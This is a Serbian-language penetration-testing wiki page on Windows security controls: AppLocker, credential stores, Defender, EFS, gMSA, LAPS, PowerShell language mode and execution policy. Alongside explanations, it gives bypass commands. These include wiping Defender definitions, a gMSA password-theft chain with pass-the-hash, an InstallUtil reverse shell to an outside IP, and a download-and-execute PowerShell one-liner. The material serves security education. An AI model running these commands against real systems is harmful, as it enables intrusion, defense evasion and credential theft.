# Windows bezbednosne kontrole

{{#include ../../banners/hacktricks-training.md}}

## AppLocker politika

Lista dozvoljenih aplikacija je spisak odobrenih softverskih aplikacija ili izvršnih fajlova koji su dozvoljeni da budu prisutni i pokrenuti na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoftovo rešenje za aplikacionu belu listu i daje sistemskim administratorima kontrolu nad **koje aplikacije i fajlove korisnici mogu pokretati**. Omogućava **preciznu kontrolu** nad izvršnim fajlovima, skriptama, Windows installer fajlovima, DLL-ovima, pakovanim aplikacijama i pakovanim installerima aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i pravo pisanja u određene direktorijume, **but this can all be bypassed**.

### Provera

Proverite koji fajlovi/ekstenzije su na crnoj/beloj listi:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja u registru sadrži konfiguracije i politike koje primenjuje AppLocker, i omogućava pregled trenutnog skupa pravila koja se sprovode na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Zaobilaženje

- Korisni direktorijumi u koje se može pisati za zaobilaženje AppLocker politike: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje direktorijumi u koje se može pisati koje možete iskoristiti da ovo zaobiđete.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Uobičajeno **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisana pravila** takođe se mogu zaobići
- Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder nazvan `allowed`** bilo gde i biće dozvoljen.
- Organizacije često fokusiraju blokiranje **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** izvršnog fajla, ali zaborave na **druge** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement** retko je omogućena zbog dodatnog opterećenja koje može staviti na sistem i količine testiranja potrebnog da se osigura da ništa neće puknuti. Dakle, korišćenje **DLL-ova kao backdoora** pomaže u zaobilaženju AppLockera.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite PowerShell** kod u bilo kom procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Čuvanje kredencijala

### Menadžer sigurnosnih naloga (SAM)

Lokalni kredencijali se nalaze u ovom fajlu, lozinke su heširane.

### Lokalna sigurnosna vlast (LSA) - LSASS

**Kredencijali** (heširani) su **sačuvani** u **memoriji** ovog subsistema iz razloga Single Sign-On.\  
**LSA** administrira lokalnu **bezbednosnu politiku** (politika lozinki, dozvole korisnika...), **autentikaciju**, **access tokens**...\  
LSA će biti taj koji će **proveravati** prosleđene kredencijale unutar **SAM** fajla (za lokalnu prijavu) i **komunicirati** sa **domain controller-om** da autentifikuje korisnika domena.

**Kredencijali** su **sačuvani** unutar **process-a LSASS**: Kerberos tiketi, NT i LM heševi, lako dešifrovane lozinke.

### LSA tajne

LSA može sačuvati na disku neke kredencijale:

- Lozinka computer naloga Active Directory-ja (ako domain controller nije dostupan).
- Lozinke naloga Windows servisa
- Lozinke za scheduled tasks
- Još (lozinke IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutna je samo na Domain Controller-ima.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je antivirus dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što su **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da biste proverili **status** **Defender-a** možete pokrenuti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da znate da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Za enumeraciju ga takođe možete pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistem za enkripciju fajlova (EFS)

EFS štiti fajlove pomoću enkripcije, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se šifruje korisnikovim **javnim ključem** i čuva u $EFS **alternative data stream** šifrovanog fajla. Kada je potrebno dešifrovanje, odgovarajući **privatni ključ** korisničkog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS stream-a. Više detalja možete pronaći [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariji dešifrovanja bez inicijative korisnika** uključuju:

- Kada se fajlovi ili folderi premeste na fajl sistem koji nije EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), oni se automatski dešifruju.
- Šifrovani fajlovi poslati preko mreže koristeći SMB/CIFS protokol se dešifruju pre prenosa.

Ova metoda enkripcije omogućava **transparentan pristup** šifrovanim fajlovima vlasniku. Međutim, samo menjanje vlasnikove lozinke i prijava neće obezbediti dešifrovanje.

Zaključci:

- EFS koristi simetrični FEK, koji je šifrovan korisnikovim javnim ključem.
- Dešifrovanje koristi korisnikov privatni ključ da pristupi FEK-u.
- Automatsko dešifrovanje se dešava u specifičnim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Šifrovani fajlovi su vlasniku dostupni bez dodatnih koraka.

### Provera informacija o EFS

Proverite da li je **korisnik** **koristio** ovu **uslugu** proverom da li postoji ovaj put:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** fajlu koristeći cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar foldera da **enkriptujete** i **dešifrujete** sve fajlove

### Dekripcija EFS fajlova

#### Biti SYSTEM

Ovaj način zahteva da žrtvin **korisnik** pokreće neki **proces** na hostu. Ako je to slučaj, koristeći `meterpreter` sesiju možete imitirati token procesa tog korisnika (`impersonate_token` iz `incognito`). Ili jednostavno možete `migrate` u proces tog korisnika.

#### Poznavanje lozinke korisnika


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grupni upravljani servisni nalozi (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** da pojednostavi upravljanje servisnim nalozima u IT infrastrukturi. Za razliku od tradicionalnih servisnih naloga koji često imaju uključenu opciju "**Password never expire**", gMSA pružaju sigurnije i jednostavnije rešenje:

- **Automatsko upravljanje lozinkom**: gMSA koriste kompleksnu, 240-karakternu lozinku koja se automatski menja u skladu sa politikom domena ili računara. Ovaj proces obavlja Microsoft-ov Key Distribution Service (KDC), eliminišući potrebu za ručnim ažuriranjem lozinki.
- **Povećana bezbednost**: ovi nalozi su imuni na zaključavanja i ne mogu se koristiti za interaktivne prijave, što poboljšava bezbednost.
- **Podrška za više hostova**: gMSA se mogu deliti na više hostova, što ih čini idealnim za servise koji rade na više servera.
- **Mogućnost zakazanih zadataka**: za razliku od managed service accounts, gMSA podržavaju pokretanje zakazanih zadataka.
- **Pojednostavljeno upravljanje SPN-om**: sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, što pojednostavljuje upravljanje SPN-om.

Lozinke za gMSA se čuvaju u LDAP atributu _**msDS-ManagedPassword**_ i automatski se resetuju svakih 30 dana od strane Domain Controller-a (DC). Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može biti dohvaćena samo od strane autorizovanih administratora i servera na kojima su gMSA instalirani, što obezbeđuje sigurno okruženje. Za pristup ovim informacijama potreban je zaštićen konekcija kao što je LDAPS, ili konekcija mora biti autentifikovana sa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Takođe, pogledajte ovu [web page](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay attack** da biste pročitali **lozinku** **gMSA**.

### Zloupotreba povezivanja ACL-ova za čitanje upravljane lozinke gMSA (GenericAll -> ReadGMSAPassword)

U mnogim okruženjima, korisnici sa niskim privilegijama mogu doći do tajni gMSA bez kompromitovanja DC-a zloupotrebom pogrešno konfigurisanim ACL-ovima objekata:

- Grupi kojom možete upravljati (npr. preko GenericAll/GenericWrite) dodeljeno je `ReadGMSAPassword` nad gMSA.
- Dodavanjem sebe u tu grupu nasleđujete pravo da pročitate `msDS-ManagedPassword` blob gMSA preko LDAP-a i dođete do upotrebljivih NTLM kredencijala.

Tipičan tok rada:

1) Pronađite put pomoću BloodHound i označite svoje foothold principals kao Owned. Potražite ivice kao:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodajte sebe u posrednu grupu kojom upravljate (primer sa bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Pročitajte upravljanu lozinku gMSA preko LDAP-a i izvedite NTLM hash. NetExec automatizuje ekstrakciju `msDS-ManagedPassword` i konverziju u NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentifikujte se kao gMSA koristeći NTLM hash (nije potreban plaintext). Ako je nalog u Remote Management Users, WinRM će raditi direktno:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Napomene:
- LDAP čitanja atributa `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Alati ovo automatski obrađuju.
- gMSA-ima se često dodeljuju lokalna prava kao što je WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste planirali lateral movement.
- Ako vam je potreban samo blob da sami izračunate NTLM, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim Administrator lozinkama. Ove lozinke, koje su **nasumično generisane**, jedinstvene i **redovno menjane**, čuvaju se centralno u Active Directory. Pristup ovim lozinkama je ograničen ACL-ima samo za ovlašćene korisnike. Ako su dodeljena odgovarajuća prava, omogućeno je čitanje lokalnih admin lozinki.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcionalnosti** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML-based workflows, PowerShell classes, i slično.

### **Proverite**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Na aktuelnim verzijama Windows-a taj Bypass neće raditi, ali možete koristiti[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Za kompajliranje možda ćete morati** **da** _**Dodate referencu**_ -> _Browse_ ->_Browse_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da izvršite Powershell kod u bilo kojem procesu i zaobiđete ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS politika izvršavanja

Podrazumevano je podešeno na **restricted.** Glavni načini za zaobilaženje ove politike:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija se može naći [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI će biti zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za to je Kerberos. Zatim će SSPI pregovarati koji autentifikacioni protokol će biti korišćen; ti autentifikacioni protokoli se zovu Security Support Provider (SSP), nalaze se na svakoj Windows mašini u obliku DLL-a i obe mašine moraju podržavati isti da bi mogle da komuniciraju.

### Glavni SSP-ovi

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Razlozi kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: web serveri i LDAP, lozinka u obliku MD5 heša
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovori mogu ponuditi više metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za saglasnost pri aktivnostima sa povišenim privilegijama**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
